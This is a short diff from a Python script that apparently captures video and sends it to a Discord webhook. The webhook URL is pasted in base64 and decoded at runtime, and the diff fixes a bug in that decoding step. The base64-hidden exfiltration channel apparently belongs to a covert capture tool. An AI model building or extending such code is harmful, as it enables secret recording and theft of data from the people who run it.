@@ -126,8 +126,8 @@ def CHEESE():
     subprocess.run("del input.mp4", shell=True)
 
     # define your discord webhook
-    YOUR_WEBHOOK = "PASTE YOUR WEBHOOK HERE IN BASE64 FORMAT!"
-    webhook_url = base64.b64decode(b).decode("utf-8")
+    YOUR_WEBHOOK = "PASTE YOUR WEBHOOK HERE IN BASE64 FORMAT! IF YOU USE WINDOWS AN THE BASE64ENCODER.py THE BASE64 STRING WILL AUTOMATICALLY COPIED INTO YOUR CLIPBOARD"
+    webhook_url = base64.b64decode(YOUR_WEBHOOK).decode("utf-8")
    
     file_path = 'video.mp4'
 
